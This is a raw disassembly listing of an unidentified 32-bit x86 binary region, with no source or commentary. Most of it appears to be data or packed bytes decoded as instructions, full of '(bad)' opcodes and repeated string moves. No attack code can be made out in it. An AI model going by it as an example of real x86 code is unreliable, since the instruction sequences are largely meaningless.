  422476:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42247d:	sub    al,0xf7
  42247f:	cs pop ss
  422481:	push   cs
  422482:	adc    eax,0x3a49108
  422487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422488:	fwait
  422489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42248a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  422491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422492:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249a:	shl    DWORD PTR [edx],cl
  42249c:	shr    DWORD PTR [ecx+esi*8],1
  42249f:	or     al,0xf7
  4224a1:	push   cs
  4224a2:	pop    ss
  4224a3:	outs   dx,BYTE PTR ds:[esi]
  4224a4:	adc    eax,0x3a49168
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	fwait
  4224ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ac:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	xor    eax,0x9ba48da4
  4224b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ba:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  4224c2:	imul   DWORD PTR [esi+0x17]
  4224c5:	dec    esi
  4224c6:	adc    eax,0x37a49148
  4224cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224cc:	fwait
  4224cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ce:	jae    0x422474
  4224d0:	popf   
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  4224d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224da:	fwait
  4224db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224dc:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  4224e4:	test   DWORD PTR [esi+0x16],0x91a814ae
  4224eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ec:	aaa    
  4224ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ee:	fwait
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	jae    0x422496
  4224f2:	popf   
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	pop    ss
  4224f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f6:	xchg   ebp,eax
  4224f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f8:	push   ecx
  4224f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fa:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  422501:	inc    edx
  422502:	ror    DWORD PTR [eax+esi*8-0x54],1
  422506:	imul   BYTE PTR [esi-0x77eb71ea]
  42250c:	xchg   ecx,eax
  42250d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250e:	aaa    
  42250f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422510:	fwait
  422511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422512:	jae    0x4224b8
  422514:	popf   
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	fwait
  42251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422520:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  422527:	mov    esi,?
  422529:	mov    ss,WORD PTR [esi]
  42252b:	out    dx,al
  42252c:	adc    al,0xe8
  42252e:	xchg   ecx,eax
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	aaa    
  422531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422532:	fwait
  422533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422534:	jae    0x4224da
  422536:	popf   
  422537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422538:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  42253f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422540:	fwait
  422541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422542:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42254a:	imul   dh
  42254c:	push   ss
  42254d:	into   
  42254e:	adc    al,0xc8
  422550:	xchg   ecx,eax
  422551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422552:	cmp    eax,0x51a49ba4
  422557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422558:	popf   
  422559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42255a:	jnp    0x422500
  42255c:	xchg   ebx,eax
  42255d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42255e:	fwait
  42255f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422560:	xchg   ecx,eax
  422561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422562:	shl    dl,cl
  422564:	shr    ah,1
  422566:	lock int3 
  422568:	test   dh,0x16
  42256b:	cs adc al,0x28
  42256e:	push   ss
  42256f:	push   cs
  422570:	adc    al,0x8
  422572:	xchg   ebx,eax
  422573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422574:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42257b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42257c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422584:	fwait
  422585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422586:	lea    esp,[edx+edx*8-0xfd32fde]
  42258d:	or     al,0xf6
  42258f:	push   cs
  422590:	push   ss
  422591:	outs   dx,BYTE PTR ds:[esi]
  422592:	adc    al,0x68
  422594:	xchg   ecx,eax
  422595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422596:	add    BYTE PTR [eax],al
  422598:	and    BYTE PTR [edx+eax*2],ah
  42259b:	add    BYTE PTR [esi+eiz*1],ch
  42259e:	inc    edx
  42259f:	add    BYTE PTR [esi+eiz*1],dh
  4225a2:	inc    edx
  4225a3:	add    BYTE PTR [edi+eiz*1+0x24180042],bh
  4225aa:	inc    edx
  4225ab:	add    BYTE PTR [eax],bh
  4225ad:	es inc edx
  4225af:	add    BYTE PTR [edx+0x1200427c],bl
  4225b5:	jg     0x4225f9
  4225b7:	add    BYTE PTR [eax],ch
  4225b9:	daa    
  4225ba:	inc    edx
  4225bb:	add    BYTE PTR [edi+eiz*1+0x26140042],ch
  4225c2:	inc    edx
  4225c3:	add    BYTE PTR [eax],bl
  4225c5:	es inc edx
  4225c7:	add    BYTE PTR [eax+0x7c004227],ch
  4225cd:	es inc edx
  4225cf:	add    BYTE PTR [edx-0x35],cl
  4225d2:	push   es
  4225d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d4:	scas   al,BYTE PTR es:[edi]
  4225d5:	or     al,0x6
  4225d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d8:	xor    BYTE PTR [esi],ah
  4225da:	inc    edx
  4225db:	add    al,ah
  4225dd:	es inc edx
  4225df:	add    ah,dh
  4225e1:	es inc edx
  4225e3:	add    BYTE PTR [eax],al
  4225e5:	daa    
  4225e6:	inc    edx
  4225e7:	add    BYTE PTR [eax],dl
  4225e9:	daa    
  4225ea:	inc    edx
  4225eb:	add    BYTE PTR [eax+0x26],ch
  4225ee:	inc    edx
  4225ef:	add    BYTE PTR [esp],bl
  4225f2:	inc    edx
  4225f3:	add    BYTE PTR [eax+0x78004226],cl
  4225f9:	es inc edx
  4225fb:	add    al,al
  4225fd:	daa    
  4225fe:	inc    edx
  4225ff:	add    BYTE PTR [esi+0x38a4069a],ch
  422605:	inc    ebx
  422606:	out    0xbd,eax
  422608:	cwde   
  422609:	es inc edx
  42260b:	add    BYTE PTR [eax+0x3c004226],ah
  422611:	es inc edx
  422613:	add    BYTE PTR [edi+eax*4],ah
  422616:	loopne 0x4225d5
  422618:	jbe    0x422695
  42261a:	pop    ds
  42261b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42261c:	add    BYTE PTR [eax],al
  42261e:	inc    eax
  42261f:	add    dl,ch
  422621:	rcl    dl,cl
  422623:	pop    ecx
  422624:	movq   QWORD PTR [edx+0x0],mm0
  422628:	(bad)  [edi+ebp*2+0x63]
  42262c:	ja     0x42263d
  42262e:	pop    ebx
  42262f:	xor    DWORD PTR [esi-0x5],esi
  422632:	(bad)  
  422633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422634:	mov    dl,0xc
  422636:	xchg   ebx,eax
  422637:	test   al,0x24
  422639:	es inc edx
  42263b:	add    BYTE PTR [edx-0x555bf926],ch
  422641:	fiadd  WORD PTR [esi]
  422643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422645:	fiadd  DWORD PTR [esi]
  422647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422648:	mov    ds:0xbea406da,al
  42264d:	fiadd  DWORD PTR [esi]
  42264f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422650:	mov    edx,0xb6a406da
  422655:	fiadd  DWORD PTR [esi]
  422657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422658:	mov    dl,0xda
  42265a:	push   es
  42265b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42265c:	mov    ds,edx
  42265e:	push   es
  42265f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422660:	mov    bl,dl
  422662:	push   es
  422663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422664:	out    dx,al
  422665:	fiadd  DWORD PTR [esi]
  422667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422668:	dec    DWORD PTR [ebx]
  42266a:	adc    edi,DWORD PTR [edx]
  42266c:	adc    al,0x24
  42266e:	inc    edx
  42266f:	add    BYTE PTR ds:0x17004229,al
  422675:	loop   0x422600
  422677:	js     0x422627
  422679:	call   0xa4d7:0xcb3aa406
  422680:	and    al,0x75
  422682:	add    BYTE PTR [eax],al
  422684:	adc    BYTE PTR [edx+eax*2],ah
  422687:	add    BYTE PTR [edx],ah
  422689:	inc    ebx
  42268a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422698:	hlt    
  422699:	clc    
  42269a:	sar    BYTE PTR [ebp+0x319340bf],cl
  4226a0:	sub    eax,DWORD PTR [edi+0x1f]
  4226a3:	jle    0x4226a5
	...
  4226c9:	add    BYTE PTR [eax],al
  4226cb:	add    BYTE PTR [edx+0x427c],bl
	...
  4226d9:	add    BYTE PTR [eax],al
  4226db:	add    cl,bh
  4226dd:	jmp    0xa48f2723
  4226e2:	push   ecx
  4226e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e4:	jg     0x42268a
  4226e6:	inc    edi
  4226e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e8:	push   ecx
  4226e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ea:	inc    ebx
  4226eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ec:	std    
  4226ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ee:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  4226f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f6:	push   ebx
  4226f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f8:	dec    ecx
  4226f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fa:	std    
  4226fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fc:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  422703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422704:	push   ecx
  422705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422706:	jg     0x4226ac
  422708:	std    
  422709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270a:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  422711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422712:	dec    ebx
  422713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422714:	inc    ebx
  422715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422716:	jne    0x4226bc
  422718:	pop    ecx
  422719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271a:	jnp    0x4226c0
  42271c:	dec    ecx
  42271d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271e:	fwait
  42271f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  422728:	xor    eax,eax
  42272a:	xor    esp,DWORD PTR [eax]
  42272c:	xor    eax,DWORD PTR [eax]
  42272e:	xor    esp,DWORD PTR [eax+0x33]
  422731:	inc    eax
  422732:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  422738:	xor    al,al
  42273a:	xor    ah,BYTE PTR [eax]
  42273c:	xor    al,BYTE PTR [eax]
  42273e:	xor    ah,BYTE PTR [eax+0x32]
  422741:	inc    eax
  422742:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422748:	xor    ecx,esp
  42274a:	xor    ecx,esi
  42274c:	xor    ecx,eax
  42274e:	xor    ecx,edx
  422750:	xor    edx,esp
  422752:	xor    edx,esi
  422754:	xor    edx,eax
  422756:	xor    edx,edx
  422758:	xor    ebx,esp
  42275a:	xor    ebx,esi
  42275c:	xor    ebx,eax
  42275e:	xor    ebx,edx
  422760:	xor    eax,esi
  422762:	push   ebx
  422763:	shl    BYTE PTR [ebx-0x40],0x93
  422767:	rcl    DWORD PTR [esi-0x56],0x15
  42276b:	into   
  42276c:	xchg   ebp,eax
  42276d:	dec    ecx
  42276e:	xor    ecx,esp
  422770:	sbb    eax,0x50abaae2
  422775:	push   0x1e
  422777:	cs je  0x42278e
  42277a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422780:	imul   edi,edx,0xffffffd5
  422783:	leave  
  422784:	daa    
  422785:	dec    eax
  422786:	out    dx,eax
  422787:	pushf  
  422788:	mov    dh,0xdf
  42278a:	dec    esi
  42278b:	xchg   ebp,eax
  42278c:	lock xor DWORD PTR [esi-0x6c],ebp
  422790:	inc    ebp
  422791:	or     eax,0xc1470876
  422796:	js     0x422753
  422798:	popa   
  422799:	pop    ecx
  42279a:	jecxz  0x422807
  42279c:	mov    BYTE PTR [edx-0x56],0x5
  4227a0:	cs enter 0xaa46,0x44
  4227a5:	aas    
  4227a6:	inc    ebp
  4227a7:	leave  
  4227a8:	test   BYTE PTR [ebx+0x819a593],0xd8
  4227af:	jl     0x422759
  4227b1:	mov    es,WORD PTR [edx+0x0]
  4227b4:	jb     0x422810
  4227b6:	pop    ss
  4227b7:	sub    ebx,DWORD PTR [esi+eiz*1]
  4227ba:	inc    edx
  4227bb:	add    BYTE PTR [eax+0x76004226],al
  4227c1:	sti    
  4227c2:	fbld   TBYTE PTR [ebp+0x0]
	...
  4227d0:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  4227d6:	popa   
  4227d7:	arpl   WORD PTR [edi+0x7a],bp
  4227da:	popa   
  4227db:	outs   dx,DWORD PTR ds:[si]
  4227dd:	gs ins DWORD PTR es:[edi],dx
  4227df:	jae    0x422823
  4227e1:	outs   dx,DWORD PTR ds:[esi]
  4227e2:	ins    BYTE PTR es:[edi],dx
  4227e3:	gs mov cl,0x65
  4227e6:	in     eax,dx
  4227e7:	jg     0x422822
  4227e9:	ja     0x422854
  4227eb:	jp     0x4227e0
  4227ed:	inc    esp
  4227ee:	push   0x1b
  4227f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f1:	push   ecx
  4227f2:	dec    esp
  4227f3:	gs jb  0x42286f
  4227f6:	popa   
  4227f7:	push   ebx
  4227f8:	jne    0x42286b
  4227fa:	jae    0x42285d
  4227fc:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  422803:	inc    esp
  422804:	(bad)  [edx+0x65]
  422807:	jae    0x42285f
  422809:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  422810:	jb     0x422874
  422812:	gs je  0x4227e8
  422815:	lds    edx,FWORD PTR [eax-0x68]
  422818:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  42281c:	fs jne 0x42288e
  42281f:	push   eax
  422820:	gs fs jae 0x422891
  422824:	popa   
  422825:	ins    DWORD PTR es:[edi],dx
  422826:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  422839:	add    BYTE PTR [eax],al
  42283b:	add    BYTE PTR [esp+ecx*4],ch
  42283e:	push   ss
  42283f:	mov    esi,0x6f4c8773
  422844:	jb     0x4228b4
  422846:	jno    0x4228b1
  422848:	or     al,0x36
  42284a:	lods   al,BYTE PTR ds:[esi]
  42284b:	repnz push edx
  42284d:	je     0x4228be
  42284f:	je     0x422895
  422851:	js     0x42280f
  422853:	cmc    
  422854:	outs   dx,DWORD PTR ds:[esi]
  422855:	ins    DWORD PTR es:[edi],dx
  422856:	popa   
  422857:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42285e:	popa   
  42285f:	jb     0x4228d6
  422861:	push   0x68736f79
  422866:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42286d:	mov    ch,0xa5
  42286f:	jns    0x4228e4
  422871:	outs   dx,DWORD PTR ds:[esi]
  422872:	addr16 popa 
  422874:	add    BYTE PTR [bp+si],bh
  422877:	sub    bh,cl
  422879:	icebp  
  42287a:	gs ins BYTE PTR es:[edi],dx
  42287c:	jae    0x4228c6
  42287e:	popa   
  42287f:	je     0x4228e9
  422881:	ins    DWORD PTR es:[edi],dx
  422882:	add    BYTE PTR gs:[bx+si],al
  422886:	in     al,dx
  422887:	mov    ecx,0x414ad1d2
  42288c:	ins    DWORD PTR es:[edi],dx
  42288d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422894:	gs ins DWORD PTR es:[edi],dx
  422896:	add    BYTE PTR [eax],al
  422898:	jne    0x4228aa
  42289a:	popa   
  42289b:	or     BYTE PTR [esi+0x73654dbb],al
  4228a1:	popa   
  4228a2:	push   0x78000061
  4228a7:	loope  0x4228eb
  4228a9:	stos   BYTE PTR es:[edi],al
  4228aa:	je     0x42290d
  4228ac:	push   edi
  4228ad:	popa   
  4228ae:	jb     0x42291b
  4228b0:	jae    0x42291d
  4228b2:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  4228b9:	loope  0x422887
  4228bb:	aad    0x6f
  4228bd:	jb     0x42292b
  4228bf:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  4228c6:	je     0x4228db
  4228c8:	adc    al,BYTE PTR [ebp+0x77646172]
  4228ce:	outs   dx,DWORD PTR ds:[esi]
  4228cf:	gs ins DWORD PTR es:[edi],dx
  4228d1:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  4228d8:	outs   dx,BYTE PTR ds:[esi]
  4228d9:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  4228e0:	ja     0x422946
  4228e2:	outs   dx,DWORD PTR ds:[esi]
  4228e3:	popa   
  4228e4:	outs   dx,BYTE PTR ds:[esi]
  4228e5:	gs jae 0x42294a
  4228e8:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  4228ef:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  4228f7:	inc    ebx
  4228f8:	jb     0x4228b3
  4228fa:	sbb    al,0xd9
  4228fc:	jo     0x422967
  4228fe:	addr16 js 0x422976
  422901:	jo     0x422978
  422903:	fs add ch,cl
  422906:	xchg   esi,eax
  422907:	in     eax,dx
  422908:	jno    0x42297b
  42290a:	iret   
  42290b:	jbe    0x422906
  42290d:	or     dh,BYTE PTR [esi-0x3]
  422910:	cwde   
  422911:	int    0xd6
  422913:	std    
  422914:	pop    ebp
  422915:	fsubr  DWORD PTR [edi]
  422917:	dec    edx
  422918:	xor    eax,0xd6cd860a
  42291d:	stc    
  42291e:	inc    ebx
  42291f:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  422925:	dec    edx
  422926:	sbb    BYTE PTR [ecx+0x52],bh
  422929:	mov    ch,al
  42292b:	jns    0x42297f
  42292d:	dec    edx
  42292e:	sbb    BYTE PTR [ecx+0x6e],bh
  422931:	xchg   edx,eax
  422932:	cmp    eax,0xcd96c5cb
  422937:	in     eax,dx
  422938:	jno    0x4229ab
  42293a:	iret   
  42293b:	jbe    0x422936
  42293d:	or     dh,BYTE PTR [esi-0x3]
  422940:	int    0x96
  422942:	std    
  422943:	pop    ebp
  422944:	jns    0x422991
  422946:	pop    edx
  422947:	xor    eax,0x96cd920a
  42294c:	stc    
  42294d:	inc    ebx
  42294e:	icebp  
  42294f:	(bad)  
  422950:	das    
  422951:	int    0x76
  422953:	mov    BYTE PTR [ecx+0x6e],bh
  422956:	mov    DWORD PTR [edx-0x13749387],esi
  42295c:	jns    0x4229cc
  42295e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422964:	retf   
  422965:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42296c:	jno    0x42293d
  42296e:	jbe    0x422969
  422970:	or     dh,BYTE PTR [esi-0x3]
  422973:	int    0x96
  422975:	std    
  422976:	pop    ebp
  422977:	fdiv   DWORD PTR [ebx-0x6df55465]
  42297d:	int    0x96
  42297f:	stc    
  422980:	inc    ebx
  422981:	icebp  
  422982:	(bad)  
  422983:	test   BYTE PTR [ecx+0x6e],bh
  422986:	mov    ebp,esp
  422988:	int    0x76
  42298a:	mov    BYTE PTR [ecx+0x6e],bh
  42298d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422994:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42299b:	jno    0x42296c
  42299d:	jbe    0x422998
  42299f:	or     dh,BYTE PTR [esi-0x3]
  4229a2:	cwde   
  4229a3:	int    0xd6
  4229a5:	std    
  4229a6:	pop    ebp
  4229a7:	ret    0x2be4
  4229aa:	cmp    DWORD PTR [edx],ecx
  4229ac:	xchg   ch,cl
  4229ae:	(bad)  
  4229af:	stc    
  4229b0:	inc    ebx
  4229b1:	adc    DWORD PTR [eax+0x52794ad6],ebp
  4229b7:	test   BYTE PTR [ebx-0x78913648],ch
  4229bd:	ret    0x79ab
  4229c0:	xchg   edx,eax
  4229c1:	aad    0xcb
  4229c3:	lds    edx,FWORD PTR [esi+0x7171edcd]
  4229c9:	iret   
  4229ca:	jbe    0x4229c5
  4229cc:	or     dh,BYTE PTR [esi-0x3]
  4229cf:	int    0x96
  4229d1:	std    
  4229d2:	pop    ebp
  4229d3:	pop    ecx
  4229d4:	ins    BYTE PTR es:[edi],dx
  4229d5:	cmp    dh,BYTE PTR ds:0x96cd920a
  4229db:	stc    
  4229dc:	inc    ebx
  4229dd:	icebp  
  4229de:	(bad)  
  4229df:	push   ebx
  4229e0:	int    0x76
  4229e2:	mov    BYTE PTR [ecx+0x6e],bh
  4229e5:	mov    BYTE PTR [edi+0x47816c79],ah
  4229eb:	jns    0x422a5b
  4229ed:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  4229f3:	call   0xcded:0xcd965b98
  4229fa:	jbe    0x422a30
  4229fc:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  422a03:	sbb    al,0x81
  422a05:	(bad)  
  422a06:	and    al,0x98
  422a08:	int    0xd6
  422a0a:	adc    al,0x47
  422a0c:	mov    ds:0xff8eca62,al
  422a11:	add    al,0x7d
  422a13:	add    ch,dl
  422a15:	lods   eax,DWORD PTR ds:[esi]
  422a16:	clc    
  422a17:	icebp  
  422a18:	jo     0x4229e4
  422a1a:	(bad)  
  422a1c:	jge    0x422a1e
  422a1e:	aad    0xad
  422a20:	clc    
  422a21:	icebp  
  422a22:	jo     0x4229b6
  422a24:	adc    ecx,ebp
  422a26:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  422a2d:	jo     0x422a9f
  422a2f:	jo     0x422aa1
  422a31:	jo     0x4229cd
  422a33:	xor    esi,edi
  422a35:	cwde   
  422a36:	add    al,0xc
  422a38:	add    BYTE PTR [ebp-0x80],bl
  422a3b:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a41:	or     DWORD PTR [eax-0x75],ebx
  422a44:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a4b:	jecxz  0x422a38
  422a4d:	hlt    
  422a4e:	scas   eax,DWORD PTR es:[edi]
  422a4f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a56:	sub    dl,0xfa
  422a59:	iret   
  422a5a:	pop    eax
  422a5b:	iret   
  422a5c:	push   0xffffffcd
  422a5e:	out    0xfd,al
  422a60:	int    0x76
  422a62:	adc    DWORD PTR [ebx],esi
  422a64:	out    0x34,al
  422a66:	sub    ecx,ecx
  422a68:	or     dh,BYTE PTR [esi-0x43]
  422a6b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a71:	sub    BYTE PTR [edi],0x6
  422a74:	sub    DWORD PTR [eax-0x72357f80],eax
  422a7a:	cmc    
  422a7b:	sub    esp,esi
  422a7d:	in     eax,dx
  422a7e:	aad    0xe9
  422a80:	add    ebx,ebp
  422a82:	mov    bh,dh
  422a84:	fcmovnbe st,st(5)
  422a86:	out    dx,eax
  422a87:	pushf  
  422a88:	xchg   edi,edi
  422a8a:	test   al,0xcf
  422a8c:	fs adc ebx,0xffffffe9
  422a90:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a94:	iret   
  422a95:	int3   
  422a96:	call   0x80c2795f
  422a9b:	jno    0x422a35
  422a9d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422aa7:	int    0xe6
  422aa9:	std    
  422aaa:	xor    esp,esi
  422aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aad:	das    
  422aae:	pop    ecx
  422aaf:	push   0xffffffcd
  422ab1:	(bad)  
  422ab2:	or     eax,0xfcde9e3
  422ab7:	sub    edi,eax
  422ab9:	xchg   DWORD PTR [edi],ecx
  422abb:	iret   
  422abc:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422ac2:	add    BYTE PTR [eax-0x102c8233],0x88
  422ac9:	add    al,0xf2
  422acb:	add    DWORD PTR [ebx+0x2],0x80818069
  422ad2:	adc    dh,0x4e
  422ad5:	inc    ebx
  422ad6:	jns    0x422a5a
  422ad8:	fldlg2 
  422ada:	es int 0xc6
  422add:	or     eax,0x809221bd
  422ae2:	add    al,0x81
  422ae5:	mov    al,ds:0xfb87d287
  422aea:	add    al,0xbd
  422aec:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422af3:	jns    0x422ac2
  422af5:	ins    DWORD PTR es:[edi],dx
  422af6:	and    ch,0xa0
  422af9:	push   edx
  422afa:	add    al,0x3
  422afc:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422b02:	push   edx
  422b03:	add    al,0x3
  422b05:	push   ebx
  422b06:	mov    al,cl
  422b08:	test   bh,bh
  422b0a:	retf   
  422b0b:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422b13:	(bad)  
  422b14:	in     al,dx
  422b15:	outs   dx,DWORD PTR ds:[esi]
  422b16:	rcl    bl,1
  422b18:	(bad)  
  422b19:	jge    0x422ad8
  422b1b:	outs   dx,DWORD PTR ds:[esi]
  422b1c:	xchg   edx,eax
  422b1d:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422b24:	sahf   
  422b25:	mov    al,ds:0x3454009e
  422b2a:	jno    0x422b8e
  422b2c:	popa   
  422b2d:	mov    ah,0x86
  422b2f:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422b36:	push   cs
  422b37:	(bad)  
  422b38:	jge    0x422af7
  422b3a:	push   eax
  422b3b:	xchg   edx,eax
  422b3c:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b43:	jge    0x422b02
  422b45:	push   ss
  422b46:	xchg   edx,eax
  422b47:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b4e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b54:	jo     0x422b23
  422b56:	(bad)  
  422b57:	std    
  422b58:	xor    edx,esi
  422b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b5b:	inc    ebx
  422b5c:	(bad)  
  422b5d:	xor    al,0x2f
  422b5f:	or     esp,ebx
  422b61:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b6b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b75:	int    0xd6
  422b77:	popf   
  422b78:	aam    0x23
  422b7a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b80:	or     ch,0xd6
  422b83:	xchg   ebp,eax
  422b84:	aam    0x89
  422b86:	int    0xd6
  422b88:	icebp  
  422b89:	int    0x8d
  422b8b:	xchg   ebp,eax
  422b8c:	or     cl,BYTE PTR [ebp-0x6272320f]
